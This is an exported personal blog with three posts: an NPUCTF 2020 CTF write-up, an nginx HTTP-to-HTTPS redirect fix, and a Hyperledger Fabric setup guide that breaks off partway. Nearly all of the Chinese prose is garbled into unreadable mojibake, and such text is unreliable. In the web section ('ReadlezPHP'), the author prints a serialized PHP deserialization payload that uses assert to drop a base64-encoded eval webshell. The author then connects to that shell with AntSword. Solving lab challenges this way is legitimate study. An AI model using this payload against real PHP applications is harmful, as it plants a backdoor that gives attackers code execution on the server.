<p>è™ç¬¦çš„webï¼Œæš‚æ—¶ä¸ä¼šã€‚ã€‚ç­‰å•¥æ—¶å€™å¤§æ¦‚çœ‹æ‡‚wpäº†ï¼Œå°±é¢å‘wpå¤ç›˜ä¸€ä¸‹</p>
<p>ä¸‹é¢è¿›å…¥æ­£é¢˜ï¼ŒNPUçš„miscä¹Ÿæ˜¯çœŸçš„ğŸš¹ï¼Œè€æŠ˜ç£¨äººäº†ã€‚ã€‚ã€‚å¥—å¨ƒæœ‰ä¸€æ‰‹çš„ã€‚ã€‚</p>
<p>NPUçš„webå·²ç»åœ¨buuä¸Šäº†ï¼Œç­‰åšå®Œäº†å°±åœ¨è¿™å†å¤ç›˜ä¸€ä¸‹ã€‚</p>
<p>miscç­¾åˆ°æ˜¯ä¸ªmcï¼Œé›¶è§£ï¼Ÿå¿˜è®°äº†ï¼Œé¢˜ç›®æ–°é¢–ï¼Œå†…å®¹åŠé€€ã€‚ã€‚</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æŠ½è±¡å¸¦å¸ˆ"><a href="#æŠ½è±¡å¸¦å¸ˆ" class="headerlink" title="æŠ½è±¡å¸¦å¸ˆ"></a>æŠ½è±¡å¸¦å¸ˆ</h3><p>â­•ğŸ¦…æ¥ğŸ”ªè¥¿åŒ—å·¥âœŒ å¸¦â„ è¥¿è¸¢èªâ›ğŸ–Šèµ›ğŸ”ŸğŸ€â¬†ğŸ‘„â–å•ğŸ’§ğŸ–Šèµ›</p>
<p>ğŸŒ¶â‘©ğŸ’‰ğŸ’§ğŸ‚ğŸº</p>
<p>NPUCTF{æ¬¢è¿â¼¤å®¶æ¥åˆ°â»„åŒ—â¼¯ä¸šâ¼¤å­¦CTFâ½èµ›ä¸–ç•Œä¸Šæœ€ç®€å•çš„â½èµ›}</p>
<h3 id="HappyCheckInVerification"><a href="#HappyCheckInVerification" class="headerlink" title="HappyCheckInVerification"></a>HappyCheckInVerification</h3><p>æ€è·¯ï¼šzipä¿®å¤ã€ä¼ªåŠ å¯†ã€è¡¥å…¨äºŒä½ç å®šä½ã€ä¸ä½›è®ºç¦…ã€base16ã€urldecodeã€base64ã€dtmfç”µè¯éŸ³ã€å¾®ä¿¡å…¬ä¼—å·ã€æ— çº¿ç”µè¯†åˆ«Robot36</p>
<p>è¿™é¢˜å¾ˆå¤šæ— æ„ä¹‰çš„å¥—å¨ƒï¼Œå…³è”æ€§ä¹Ÿæ²¡æœ‰é‚£ä¹ˆå¼ºï¼Œæœ€åè¿˜å¾—å»æŠŠè§†é¢‘é‡Œçš„ç”µè¯éŸ³base64åŠ å¯†å‘åˆ°å…¬ä¼—å·ä¸Šï¼ˆè¿™è°æƒ³å¾—åˆ°å˜›ï¼‰ï¼Œå¾—åˆ°ä¸€æ®µéŸ³é¢‘å†ç”¨æ— çº¿ç”µè¯†åˆ«ï¼Œwpå°±ä¸å†™äº†ã€‚è¯¦ç»†wpå¯ä»¥å»è¿™é‡Œçœ‹<a href="https://l1near.top/index.php/2020/04/20/33.html" target="_blank" rel="noopener">https://l1near.top/index.php/2020/04/20/33.html</a></p>
<h3 id="ç¢°ä¸Šå½©è™¹ï¼Œåƒå®šå½©è™¹"><a href="#ç¢°ä¸Šå½©è™¹ï¼Œåƒå®šå½©è™¹" class="headerlink" title="ç¢°ä¸Šå½©è™¹ï¼Œåƒå®šå½©è™¹"></a>ç¢°ä¸Šå½©è™¹ï¼Œåƒå®šå½©è™¹</h3><p>æ€è·¯ï¼šç©ºæ ¼è½¬æ‘©æ–¯ã€autokeyçˆ†ç ´ã€stringsæ–‡ä»¶å‘ç°å­—ç¬¦ä¸²ã€é›¶å­—ç¬¦å®½åº¦éšå†™ã€NTFSã€è¯é¢‘ç»Ÿè®¡ã€base64ã€encryptoã€è„‘æ´ï¼ˆåˆ å»stringså­—ç¬¦ä¸²ï¼‰ã€foremostã€gimpæå–é¢œè‰²å¹¶æ¯”è¾ƒhtmlæ ‡è®°åä¸¤ä½ã€æ‹¼èµ·æ¥è½¬16è¿›åˆ¶ã€éšè—æ–‡å­—ã€ALPHUCK</p>
<p>ç›–ä¹å¸Œå¸ˆå‚…çš„é¢˜ï¼Œæœ‰ç‚¹æ‡’äº†ï¼Œå¯ä»¥ç›´æ¥å»è¿™é‡Œçœ‹<a href="http://www.ga1axy.top/index.php/archives/27/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/27/</a></p>
<h3 id="è€åƒå±‚é¥¼"><a href="#è€åƒå±‚é¥¼" class="headerlink" title="è€åƒå±‚é¥¼"></a>è€åƒå±‚é¥¼</h3><p>æ€è·¯ï¼šæ–‡ä»¶åˆ†ç¦»ã€base64ã€LSBã€01åºåˆ—è½¬äºŒç»´ç ã€äºŒç»´ç è¡¥å…¨ã€è„‘æ´ã€cyberchef_recipeã€Bç«™avè½¬bv</p>
<p>åŒä¸Šï¼šè¯¦ç»†wpåœ°å€<a href="http://www.ga1axy.top/index.php/archives/27/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/27/</a></p>
<p>æ€»ç»“ä¸Šä¸‰é¢˜ï¼šå·¨å¤§è„‘æ´+å¤šå±‚å¥—å¨ƒ</p>
<h3 id="å›æ”¶ç«™"><a href="#å›æ”¶ç«™" class="headerlink" title="å›æ”¶ç«™"></a>å›æ”¶ç«™</h3><p>FTK Imagerçš„ä½¿ç”¨ã€ç³»ç»Ÿé»˜è®¤çš„æ¡Œé¢å›¾ç‰‡çš„å¯»æ‰¾</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:60%;" data-src="/2020/04/22/NPUCTF-2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>RECYCLERæ–‡ä»¶å¤¹é‡Œé¢ä¹Ÿæœ‰flagæ–‡ä»¶å¤¹ï¼Œä½†æ˜¯é‚£ä¸ªå¥—å¨ƒæœ€åçš„å›¾ç‰‡æ‹¼åˆ°ä¸€èµ·çœ‹ä¸å‡ºæ¥ã€‚ã€‚</p>
<p>çœ‹wpï¼Œå‘ç°win7ç³»ç»Ÿé»˜è®¤çš„æ¡Œé¢å›¾ç‰‡éƒ½æ”¾åœ¨<code>C:\WINDOWS\Web\Wallpaper</code> é‡Œé¢ï¼Œå¾—åˆ°<code>Flag.png</code>ã€‚</p>
<p>æ”¹ä¸ªåç¼€æˆ–è€…catä¸€ä¸‹éƒ½å¯ä»¥å¾—åˆ°flag</p>
<h3 id="å‰©ä¸‹çš„Miscé¢˜"><a href="#å‰©ä¸‹çš„Miscé¢˜" class="headerlink" title="å‰©ä¸‹çš„Miscé¢˜"></a>å‰©ä¸‹çš„Miscé¢˜</h3><p>MCï¼ˆçº¢çŸ³ç”µè·¯çš„å¸¸äº®å’ŒçŸ­äº®è½¬äºŒè¿›åˆ¶ã€äºŒè¿›åˆ¶è½¬ASCIIã€ASCIIç”¨md5åŠ å¯†å³å¯ï¼‰ã€åˆ»åœ¨DNAçš„æ’¤ç¡•å„¿ï¼ˆåé€†å‘ï¼Œè¦è¯»ä»£ç ï¼Œä¸ä¼šå–½ï¼‰</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h3><p>è€ƒç‚¹ï¼šååºåˆ—åŒ–</p>
<p>æŸ¥çœ‹æºä»£ç å‘ç°<code>./time.php?source</code>ï¼Œè®¿é—®åå¾—åˆ°æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡<code>echo $b($a);</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œsystemã€execç­‰å‡½æ•°è¢«è¿‡æ»¤ï¼ˆè¿™ä¹Ÿä¸å¯èƒ½æ”¾å‘€ï¼Œè¦ä¸ç®€å•å¤šäº†ã€‚</p>
<p>æ€è·¯1ï¼š<code>assert()</code>å°†æ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“ä½œphpæ‰§è¡Œï¼Œè¯¦è§<a href="https://www.php.net/assert/" target="_blank" rel="noopener">1</a></p>
<p>æ„é€ å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'eval("file_put_contents(\'1.php\', base64_decode(\'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==\'));")'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">'assert'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">86</span>:<span class="string">"eval("</span>file_put_contents(<span class="string">'1.php'</span>, base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw=='</span>));<span class="string">")"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;&#125;</span><br><span class="line"><span class="comment">//èšå‰‘è¿ä¸Šä¹‹åå•¥ä¹Ÿæ²¡æœ‰ã€‚ã€‚æ‹¿æ’ä»¶ç»•è¿‡disable_functionsä¹‹åæ ¹ç›®å½•è¿˜æ˜¯å‡flagã€‚ä¸è¿‡ä¹Ÿå¯ä»¥åœ¨èšå‰‘ä¸Šæ‰“å¼€phpinfo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">"phpinfo()"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">"assert"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">9</span>:<span class="string">"phpinfo()"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ€è·¯2ï¼š<code>call_user_func()</code> æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œè¯¦è§<a href="https://www.php.net/call_user_func/" target="_blank" rel="noopener">2</a></p>
<p>æ„é€ å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">"phpinfo"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">"call_user_func"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">7</span>:<span class="string">"phpinfo"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">14</span>:<span class="string">"call_user_func"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°flagï¼šï¼ˆæœ‰ã€éªšæ”¾phpinfoé‡Œ</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:60%;" data-src="/2020/04/22/NPUCTF-2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>è¿™ä¸ªåšäº†ä¸¤é“æœ€ç®€å•çš„ï¼Œä¸€ä¸ªæ—¥å†ã€ä¸€ä¸ªatbashï¼Œwpå¯ä»¥ç›´æ¥æœåˆ°</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Http-&gt;Httpsã€80é‡å®šå‘443</title>
    <url>/2020/04/16/Http-301/</url>
    <content><![CDATA[<h3 id="80-gt-443"><a href="#80-gt-443" class="headerlink" title="80-&gt;443"></a>80-&gt;443</h3><p>å› ä¸ºç™¾åº¦æ”¶å½•é‚£è¾¹è¦å¼€80ç«¯å£å¹¶é‡å®šå‘åˆ°443ï¼Œæ˜¨å¤©å«Œéº»çƒ¦å°±æ²¡æ”¹ã€‚</p>
<p>ä»Šå¤©ä¸‹åˆè·Ÿç€å„ç§åšå®¢æ”¹äº†åŠå¤©ï¼Œå±å®ç»™ğŸ‘´æ•´åäº†</p>
<p>ä¸çŸ¥é“å½“åˆçœ‹çš„é‚£ä¸ªå°ğŸ¢è›‹çš„åšå®¢ï¼Œç»™ğŸ‘´ä»Šå¤©æŒ–äº†è¿™ä¹ˆå¤§ä¸€ä¸ªğŸ•³</p>
<p>ç¯å¢ƒï¼šCentos7.xã€nginxçš„é…ç½®æ–‡ä»¶åœ¨/etc/nginx/nginx.conf</p>
<p>ä¹‹å‰æhttpsçš„<a href="https://www.jianshu.com/p/8046a12fec4a" target="_blank" rel="noopener">æ•™ç¨‹</a>ï¼ŒæŒ‰è¿™ä¸ªæ”¹å®Œä¹‹åå…¶ä»–éƒ½ä¸ç”¨åŠ¨ï¼Œå®‰å…¨ç»„é‡Œ80ç«¯å£è®°å¾—åˆ«å…³ï¼Œåœ¨nginx.confé‡Œé¢åŠ ä¸Šä¸‹é¢ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.åŸŸå;</span><br><span class="line">    rewrite ^(.*)$ https:&#x2F;&#x2F;$&#123;server_name&#125;$1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶å<code>nginx -s reload</code>æˆ–è€…<code>service nginx restart</code></p>
<p>æœ¬æ¥åˆ°è¿™å°±å®Œæˆäº†ï¼Œè®¿é—®åšå®¢<a href="http://www.btis.siteå°±åº”è¯¥å¯ä»¥é‡å®šå‘åˆ°httpsäº†" target="_blank" rel="noopener">http://www.btis.siteå°±åº”è¯¥å¯ä»¥é‡å®šå‘åˆ°httpsäº†</a></p>
<p>ä½†æ˜¯æˆ‘è¿™ä¸€ç›´æç¤ºnginx: [warn] conflicting server name â€œ<a href="http://www.btis.site&quot;" target="_blank" rel="noopener">www.btis.site&quot;</a> on 0.0.0.0:80, ignored</p>
<p>æŸ¥ä¸€ä¸‹ï¼Œå¥½åƒæ²¡å•¥å¤§é—®é¢˜ï¼Œå°±æ˜¯å®šä¹‰é‡å¤äº†å‘—ï¼Œç„¶åå°±è¯•ç€è·³è½¬ã€‚ã€‚è‰¹ï¼Œä¸è¡Œã€‚ã€‚</p>
<p>æˆ‘å°±çº³äº†é—·äº†ï¼Œæˆ‘<code>conf.d</code>æ–‡ä»¶å¤¹é‡Œä¹Ÿæ²¡ä¸œè¥¿å‘€ï¼ˆæˆ‘ä»¥ä¸ºåªåŒ…å«äº†è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œçš„*.conf</p>
<p>æäº†åŠå¤©ï¼Œè¯•äº†æ”¹äº†å„ç§ä»£ç ï¼ˆåº”è¯¥æ˜¯éƒ½å¯è¡Œçš„ï¼Œifè¦å†™åœ¨serveré‡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">        listen 80; </span><br><span class="line">        server_name www.åŸŸå; </span><br><span class="line">        return 301 https:&#x2F;&#x2F;$server_name$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($scheme &#x3D; http ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($server_port &#x3D; 80 ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($ssl_protocol &#x3D; &quot;&quot;) &#123; return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125;if ($host !&#x3D; åŸŸå) &#123; return 301 $scheme:&#x2F;&#x2F;åŸŸå$request_uri; &#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿˜æ˜¯ä¸è¡Œï¼ï¼æˆ‘å°±å¥‡äº†æ€ªäº†ï¼Œè¿˜ä¸€ç›´warnï¼Œå¥½å¥½è¯»äº†ä¸€éä»£ç ï¼Œå‘ç°äº†è¿™å¥ä»£ç </p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>å…¶å®é™¤äº†conf.dè¿˜æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹é‡Œé¢çš„*.confä¹Ÿè¢«åŒ…å«äº†ï¼Œæ£€æŸ¥ä¸€ä¸‹ï¼Œè‰¹ï¼Œç½ªæ¶ä¹‹æº</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>åˆ äº†ï¼Œé‡å¯nginxï¼Œæå®šã€‚ã€‚</p>
<p>æˆ‘è¿˜æ˜¯ç‰¹æƒ³åæ§½æµè§ˆå™¨çš„ç¼“å­˜ã€‚ã€‚æˆ‘åœ¨Edgeå’ŒChromeé‡Œè®¿é—®httpè¿˜æ˜¯ä¸è·³è½¬ï¼Œåœ¨firefoxå’Œç§»åŠ¨ç«¯éƒ½å¯ä»¥äº†ã€‚ã€‚</p>
<h3 id="Other-Things"><a href="#Other-Things" class="headerlink" title="Other Things"></a>Other Things</h3><p>1.javaå‡çº§åæ³¨å†Œè¡¨é‡ç½®ï¼Œ.jaræ–‡ä»¶æ‰“ä¸å¼€</p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<blockquote>
<p>åœ¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨ä¸­ï¼Œæ‰¾åˆ°â€œHKEY_CLASSES_ROOT\Applications\javaw.exe\shell\open\commandâ€ï¼Œåœ¨å…¶ä¸­æ–‡ä»¶æ‰“å¼€å‘½ä»¤ä¸­åŠ å…¥å‚æ•°â€œ-jarâ€ï¼ˆæ— å¼•å·ï¼‰ï¼Œä¿®æ”¹åçš„æ•°å€¼ç±»ä¼¼ï¼šâ€œâ€C:\Program Files\Java\jre1.8.0_251\bin\javaw.exeâ€ -jar â€œ%1â€â€ï¼ˆåªéœ€è¦æ·»åŠ -jarå‚æ•°ï¼Œæ— éœ€ä¿®æ”¹å…¶ä»–ä¿¡æ¯ï¼‰ï¼Œä¿å­˜å¹¶é€€å‡ºæ³¨å†Œè¡¨ç¼–è¾‘å™¨ã€‚</p>
</blockquote>
<p>2.ç»™åšå®¢åŠ ä¸ª<a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93137447" target="_blank" rel="noopener">ç™¾åº¦ç»Ÿè®¡</a>ã€åšå®¢è¢«<a href="https://blog.csdn.net/qq_36759224/article/details/100899489" target="_blank" rel="noopener">æ”¶å½•</a></p>
<p>åœ¨ç™¾åº¦æˆ–è€…è°·æ­Œç»™çš„htmlé‡Œé¢åŠ å…¥è¿™ä¹ˆä¸€å¥ï¼šlayout: falseï¼Œå¯ä»¥ä½¿htmlä¸è¢«è‡ªåŠ¨åŠ ä¸Šä¸»é¢˜ï¼ˆhtmlæ”¾åœ¨sourceæ–‡ä»¶å¤¹é‡Œã€‚</p>
]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Http</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>é“¾é“¾é“¾ã€å†²å†²å†²</title>
    <url>/2020/04/16/HyperLedger-Fabric/</url>
    <content><![CDATA[<p>DDLè¦æ¥äº†ï¼Œå…‰é€Ÿå…¥é—¨å¼€å§‹â€”HyperLedger_Fabric2.0ï¼å¼€å‘å®æˆ˜-å¿«é€ŸæŒæ¡åŒºå—é“¾æŠ€æœ¯</p>
<p>åŸºç¡€å·¥å…·ï¼šé˜¿é‡Œäº‘Centos7.xï¼›xshellã€winscpä¹‹ç±»çš„sshå·¥å…·</p>
<h3 id="åŸºæœ¬ç¯å¢ƒéƒ¨ç½²"><a href="#åŸºæœ¬ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="åŸºæœ¬ç¯å¢ƒéƒ¨ç½²"></a>åŸºæœ¬ç¯å¢ƒéƒ¨ç½²</h3><p>curlã€gitã€wgetã€dockerã€docker-composeã€goè¯­è¨€ã€node.jsè¿è¡Œç¯å¢ƒä»¥åŠnpm</p>
<h3 id="Fabric-åŠç¯å¢ƒéƒ¨ç½²"><a href="#Fabric-åŠç¯å¢ƒéƒ¨ç½²" class="headerlink" title="Fabric åŠç¯å¢ƒéƒ¨ç½²"></a>Fabric åŠç¯å¢ƒéƒ¨ç½²</h3><p>1ã€åˆ›å»ºæ”¾ç½®fabricçš„æ–‡ä»¶å¤¹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger</span><br></pre></td></tr></table></figure></div>

<p>2ã€ä¸‹è½½fabricæºç ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hyperledger&#x2F;fabric.git</span><br><span class="line"></span><br><span class="line">cd fabric&#x2F;scripts</span><br></pre></td></tr></table></figure></div>

<p>3ã€æ‰§è¡Œbootstrap.shä¸‹è½½é•œåƒå’ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼š<code>./bootstrap.sh</code></p>
<p>ä¼šå‘ç°</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¡åœ¨è¿™ï¼Œæ‰€ä»¥<code>vim bootstrap.sh</code>ï¼Œå°† <strong>binariesInstall</strong> å±è”½åå†æ‰§è¡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$BINARIES</span>"</span> == <span class="string">"true"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Pull Hyperledger Fabric binaries"</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="comment">#pullBinaries</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œæ‰§è¡Œå®Œä¹‹åä¼šå‘ç°åœ¨ç›®å½•ä¸‹åˆ›å»ºäº†fabric-samplesæ–‡ä»¶å¤¹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç„¶åæŠŠä»ç½‘ä¸Šä¸‹è½½çš„<code>hyperledger-fabric-linux-amd64-2.0.0.tar.gz</code>è§£å‹åˆ°è¿™ä¸ªç›®å½•ä¸‹é¢</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf hyperledger-fabric-linux-amd64-2.0.0.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>4ã€å¯åŠ¨test-networkæµ‹è¯•ç½‘ç»œï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;scripts&#x2F;fabric-samples&#x2F;test-network</span><br><span class="line">.&#x2F;network.sh up</span><br></pre></td></tr></table></figure></div>

<p>å¦‚å›¾ï¼Œè¡¨ç¤ºå¯åŠ¨æˆåŠŸï¼Œå·²å¯åŠ¨ä¸€ä¸ªordererèŠ‚ç‚¹å’Œä¸¤ä¸ªpeerèŠ‚ç‚¹ã€‚</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ä½¿ç”¨æµ‹è¯•ç½‘ç»œ"><a href="#ä½¿ç”¨æµ‹è¯•ç½‘ç»œ" class="headerlink" title="ä½¿ç”¨æµ‹è¯•ç½‘ç»œ"></a>ä½¿ç”¨æµ‹è¯•ç½‘ç»œ</h3><p>1ã€åˆ›å»ºchannelï¼Œä½¿ç”¨network.shè„šæœ¬åˆ›å»ºæ¥åˆ›å»ºä¸€ä¸ªè¿æ¥org1å’Œorg2ç»„ç»‡å¹¶åŠ å…¥ä»–ä»¬peerçš„é€šé“ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
